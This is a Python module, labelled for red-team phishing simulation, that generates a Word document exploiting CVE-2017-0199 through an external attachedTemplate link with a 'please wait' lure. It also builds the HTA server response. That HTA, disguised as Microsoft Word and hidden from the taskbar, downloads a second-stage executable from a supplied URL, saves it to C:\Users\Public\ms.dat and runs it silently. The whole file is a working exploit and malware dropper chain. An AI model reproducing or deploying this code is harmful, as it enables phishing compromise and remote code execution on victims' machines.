"""CVE-2017-0199 (remoteTemplate) payload generator.

Generates a DOCX whose ``attachedTemplate`` relationship points at an
attacker-controlled URL.  When Word opens the document it silently fetches
the template from that URL; the attacker's server responds with an ``.hta``
body (served as ``application/hta``) that Word/MSHTA executes, yielding
macro-less code execution.

The companion :func:`build_hta_response` produces the HTA the server should
return at the template-fetch URL — it downloads and runs the beacon from a
second-stage ``payload_url``.

Two delivery surfaces are wired into the generated DOCX so the document is
robust across Word builds:

1. ``word/_rels/document.xml.rels`` — an ``attachedTemplate`` relationship
   with ``TargetMode="External"``.  This is the classic CVE-2017-0199
   vector and is what makes Word perform the fetch.
2. ``word/settings.xml`` — a ``<w:documentSettings><w:attachedTemplate
   r:id="rId1"/></w:documentSettings>`` element whose ``r:id`` resolves
   against ``word/_rels/settings.xml.rels`` to the same attacker URL.

For authorized red-team / phishing-simulation use only.  Operators must
stand up a server that returns the HTA (from :func:`build_hta_response`)
at the template URL with ``Content-Type: application/hta``.

References: CVE-2017-0199, Microsoft Word remoteTemplate / HTA handler.
"""

from __future__ import annotations

import io
import os
import zipfile
import logging
from typing import Optional

logger = logging.getLogger('dropoutjeep')

# Relationship type for the attachedTemplate link.
REL_ATTACHED_TEMPLATE = (
    'http://schemas.openxmlformats.org/officeDocument/2006/relationships/'
    'attachedTemplate'
)
REL_OFFICE_DOCUMENT = (
    'http://schemas.openxmlformats.org/officeDocument/2006/relationships/'
    'officeDocument'
)
REL_SETTINGS = (
    'http://schemas.openxmlformats.org/officeDocument/2006/relationships/'
    'settings'
)


# --- OOXML part templates ------------------------------------------------

_CONTENT_TYPES_XML = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
    '<Default Extension="rels" '
    'ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
    '<Default Extension="xml" ContentType="application/xml"/>'
    '<Override PartName="/word/document.xml" '
    'ContentType="application/vnd.openxmlformats-officedocument.'
    'wordprocessingml.document.main+xml"/>'
    '<Override PartName="/word/settings.xml" '
    'ContentType="application/vnd.openxmlformats-officedocument.'
    'wordprocessingml.settings+xml"/>'
    '</Types>'
)

_RELS_XML = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
    '<Relationships '
    'xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    '<Relationship Id="rId1" Type="{office_doc}" Target="word/document.xml"/>'
    '</Relationships>'
).format(office_doc=REL_OFFICE_DOCUMENT)


def _document_xml() -> str:
    """Minimal document body with a benign paragraph."""
    return (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<w:document '
        'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" '
        'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
        '<w:body>'
        '<w:p><w:r><w:t>Loading document, please wait...</w:t></w:r></w:p>'
        '<w:sectPr>'
        '<w:pgSz w:w="12240" w:h="15840"/>'
        '<w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440"/>'
        '<w:docPr w:id="1" w:name="Document"/>'
        '</w:sectPr>'
        '</w:body>'
        '</w:document>'
    )


def _document_rels_xml(template_url: str) -> str:
    """document.xml.rels carrying the external attachedTemplate relationship.

    This relationship is the primary CVE-2017-0199 trigger: Word follows it
    and fetches ``template_url`` when the document opens.
    """
    return (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<Relationships '
        'xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" Type="{rel}" Target="{url}" '
        'TargetMode="External"/>'
        '</Relationships>'
    ).format(rel=REL_ATTACHED_TEMPLATE, url=_xml_escape(template_url))


def _settings_xml() -> str:
    """settings.xml with the documentSettings/attachedTemplate reference."""
    return (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<w:settings '
        'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" '
        'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
        '<w:documentSettings>'
        '<w:attachedTemplate r:id="rId1"/>'
        '</w:documentSettings>'
        '<w:compat/>'
        '</w:settings>'
    )


def _settings_rels_xml(template_url: str) -> str:
    """settings.xml.rels mapping rId1 to the attacker-controlled template URL."""
    return (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<Relationships '
        'xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" Type="{rel}" Target="{url}" '
        'TargetMode="External"/>'
        '</Relationships>'
    ).format(rel=REL_ATTACHED_TEMPLATE, url=_xml_escape(template_url))


# --- helpers -------------------------------------------------------------

def _xml_escape(value: str) -> str:
    """Escape a string for safe inclusion in an XML attribute."""
    return (
        value.replace('&', '&amp;')
        .replace('<', '&lt;')
        .replace('>', '&gt;')
        .replace('"', '&quot;')
        .replace("'", '&apos;')
    )


def _hta_escape(value: str) -> str:
    """Escape a string for safe inclusion inside a VBScript string literal."""
    return value.replace('"', '""').replace('\n', ' ').replace('\r', ' ')


# --- public API -----------------------------------------------------------

def build_remote_template_docx(template_url: str,
                               output_path: str | None = None) -> bytes:
    """Generate a DOCX with a remoteTemplate reference to ``template_url``.

    When Word opens the resulting document it fetches ``template_url``.  The
    attacker server should respond with an HTA body (see
    :func:`build_hta_response`) served as ``application/hta`` so that MSHTA
    executes it.

    Args:
        template_url: attacker-controlled URL Word will fetch for the
            document template.  Serve an HTA there.
        output_path: optional path to write the generated DOCX to disk.

    Returns:
        The DOCX file as bytes.
    """
    if not template_url or not template_url.lower().startswith(('http://', 'https://')):
        raise ValueError('template_url must be an http(s) URL')

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr('[Content_Types].xml', _CONTENT_TYPES_XML)
        zf.writestr('_rels/.rels', _RELS_XML)
        zf.writestr('word/document.xml', _document_xml())
        zf.writestr('word/_rels/document.xml.rels', _document_rels_xml(template_url))
        zf.writestr('word/settings.xml', _settings_xml())
        zf.writestr('word/_rels/settings.xml.rels', _settings_rels_xml(template_url))

    data = buf.getvalue()
    logger.info('generated remoteTemplate DOCX (%d bytes) -> %s', len(data), template_url)

    if output_path:
        with open(output_path, 'wb') as fh:
            fh.write(data)
        logger.info('wrote DOCX to %s', output_path)

    return data


def build_hta_response(payload_url: str) -> str:
    """Generate the HTA content the server returns at the template URL.

    The HTA downloads ``payload_url`` to a local path and executes it via
    ``WScript.Shell``.  It is served with ``Content-Type: application/hta``
    (and a ``.hta`` filename) so MSHTA interprets it.

    Args:
        payload_url: URL of the second-stage executable to download and run.

    Returns:
        The HTA document as a string.
    """
    if not payload_url:
        raise ValueError('payload_url is required')

    safe_url = _hta_escape(payload_url)
    # Local drop path in a world-writable location.
    local_path = 'C:\\\\Users\\\\Public\\\\ms.dat'

    hta = f"""<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<HTA:APPLICATION
  ID="oApp"
  APPLICATIONNAME="Microsoft Word"
  BORDER="none"
  CAPTION="no"
  ICON=""
  SHOWINTASKBAR="no"
  SINGLEINSTANCE="yes"
  SYSMENU="no"
  INNERBORDER="no"
  SCROLL="no"
  WINDOWSTATE="minimize"
/>
<script language="VBScript">
Option Explicit

Dim http, stream, shell, savePath
savePath = "{local_path}"

On Error Resume Next
Set http = CreateObject("Microsoft.XMLHTTP")
http.Open "GET", "{safe_url}", False
http.Send

If Err.Number = 0 And http.Status = 200 Then
  Set stream = CreateObject("Adodb.Stream")
  stream.Type = 1
  stream.Open
  stream.Write http.responseBody
  stream.SaveToFile savePath, 2
  stream.Close

  Set shell = CreateObject("WScript.Shell")
  shell.Run savePath, 0, False
End If

' Self-terminate the HTA host.
Self.Close
</script>
</head>
<body>
<div style="display:none">.</div>
</body>
</html>
"""
    logger.info('generated HTA response (%d bytes) for %s', len(hta), payload_url)
    return hta
